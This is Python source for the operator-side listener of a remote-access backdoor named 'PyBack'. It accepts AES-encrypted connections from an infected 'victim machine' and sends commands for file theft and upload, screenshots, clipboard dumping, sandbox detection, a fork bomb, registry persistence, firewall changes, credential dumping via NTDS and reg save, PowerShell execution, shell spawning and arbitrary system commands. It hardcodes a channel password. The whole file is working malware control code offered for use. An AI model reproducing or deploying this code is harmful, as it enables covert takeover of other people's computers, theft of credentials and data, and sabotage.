#!/usr/bin/python
# -*- encoding: utf-8 -*-

import json
import sys
import base64
import hashlib
import socket
from Crypto import Random
from Crypto.Cipher import AES

ip='0.0.0.0' # can use noip dns
print (ip)
port = 6969

global password

# AES channel password..............
password="djknBDS89dHFS(*HFSD())"

# color codes..................
red="\033[1;32;31m"
green="\033[1;32;32m"
yellow="\033[1;32;33m"
blue="\033[1;32;34m"
cyan="\033[1;32;36m"
black="\033[1;32;30m"
r="\x1b[0m"


banner = green + """
██████╗ ██╗   ██╗██████╗  █████╗  ██████╗██╗  ██╗
██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
██████╔╝ ╚████╔╝ ██████╔╝███████║██║     █████╔╝ 
██╔═══╝   ╚██╔╝  ██╔══██╗██╔══██║██║     ██╔═██╗ 
██║        ██║   ██████╔╝██║  ██║╚██████╗██║  ██╗
╚═╝        ╚═╝   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
          
Created by: 7h3w4lk3r

Email: bl4ckr4z3r@gmail.com
""" + r


help = """
\n
********************************************************************************
* help -> print this help message                                              *
* download [file name] -> download a file (not directory)                      *
* upload [file name]  -> upload a file (not directory)                         *
* sysinfo  -> print system and OS information                                  *
* shot -> take a screenshot                                                    *
* chk  -> check if the system is a sandbox or VM                               *
* clip -> dump clipboard                                                       *
* fork -> run a fork bomb in victim machine                                    *
* persistence -> set persistence using REGKEY (windows only)                   *
* fw -> add firewall rules:  fw [in/out] [port number] [rule name]             *
* ntds -> dump credentials using ntds  in C:\Windows\Temp\copy-ntds            *
* regsave -> dump credentials using reg save in C:\Windows\Temp\               *
* powershell [cmd] OR [script] -> run the given powershell command or script   *
* spawn [ip] [port] -> spawn a separate powershell session to the given target *
* enum -> run post-exploitation enumeration                                    *
* q -> kill the backdoor                                                       *
* exit  -> exit the listener                                                   *
********************************************************************************
* ALL OTHER COMMANDS WILL BE EXECUTED AS SYSTEM SHELL COMMANDS                 *
********************************************************************************
 \n"""

# AES encryption/decryption.....................................................
class AESCipher(object):
    def __init__(self, key):
        self.bs = AES.block_size
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw.encode()))

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]


# main listener class and functions..............................................
class listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(3)
        print cyan,"[*] waiting for connection...",r
        global addr
        self.conn, addr = listener.accept()
        print green,"target ", str(addr), "is on...",r

    def encrypt(self,message):
        encrypted = AESCipher(password).encrypt(message)
        return encrypted

    def decrypt(self, message):
        decrypted = AESCipher(password).decrypt(message)
        return decrypted

    def json_send(self, data):
        json_data = json.dumps(data)
        return self.conn.send(self.encrypt(json_data))


    def receive(self):
        json_data = ""
        while True:
            json_data = json_data + self.decrypt(self.conn.recv(4096))
            return json.loads(json_data)

    def write_file(self,path,content):
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
                return "[+] download completed [+]"
        except:
            return "[-] download failed [-]"

    def read_file(self,path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read())
        except :
            return "[-] no such file or directory [-]"


    def execution(self, cmd):
        if cmd[0]=="exit":
            self.conn.close()
            exit()
        self.json_send(cmd)
        return self.receive()

# filter and run the commands......................................................
    def run(self):
        shot_count = 1
        enum_count = 1
        while True:
            cmd = raw_input(str(addr[0])+':'+str(addr[1])+" >> ")
            cmd=cmd.split(" ")
            try:
                if cmd[0] == "help":
                    print cyan,help,r
                    cmd[0] = ' '
                elif cmd[0] == "q":
                    while True:
                        choice = raw_input("[!] are you sure(y/n) ?")
                        if choice == "y":
                            break
                        elif choice == "n":
                            cmd[0] = None
                            break
                        else:
                            continue
                    pass
                elif cmd[0] == "spawn" and not cmd[1:]:
                    print red,"usage: spawn [target ip] [target port] ",r
                    cmd=""
                elif cmd[0] == "powershell" and not cmd[1:]:
                    print red,"usage: powershell [cmd] OR [script] ",r
                    cmd = ""

                elif cmd[0] == "download" and not cmd [1:] or cmd[0] == "upload" and not cmd [1:]:
                    print red,"usage: download/upload [file name] ",r
                    cmd = ""

                elif cmd[0] == "upload" and cmd[1]:
                    print blue,"[*] uploading ", str(cmd[1:]) , "...",r
                    file_content=self.read_file(cmd[1])
                    cmd.append(file_content)
                result = self.execution(cmd)
                if result == None:
                    pass
                elif cmd[0]=="download"  and cmd[1]:
                    print blue,"[*] Downloading " , ''.join(str(cmd[1])) , "...",r

                    result = self.write_file(cmd[1],result)
                    print(result)

                elif cmd[0] == "shot":
                    name = "screenshot%s.png" % str(shot_count)
                    result=self.write_file(name,result)
                    print green,"[+] screenshot captured [+]",r
                    shot_count +=1
                elif cmd[0] == "fw" and len(cmd) != 4:
                    print red,"[!] usage: fw [in/out] [port number] [rule name] [!]",r
                elif cmd[0] == "enum":
                    name = "enum" + str(enum_count) + '.txt'
                    try:
                        result=self.write_file(name,result)
                        print green,"[*] enumeration completed successfully, results saved to %s [*]" % name ,r
                    except:
                        print red,"[!] enumeration failed [!]"
                    enum_count += 1
                else:
                    print(result)
            except Exception:
                result = Exception

if __name__ == '__main__':
    try:
        print banner
        starter = listener(ip, port)
        starter.run()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception,e:
        print e
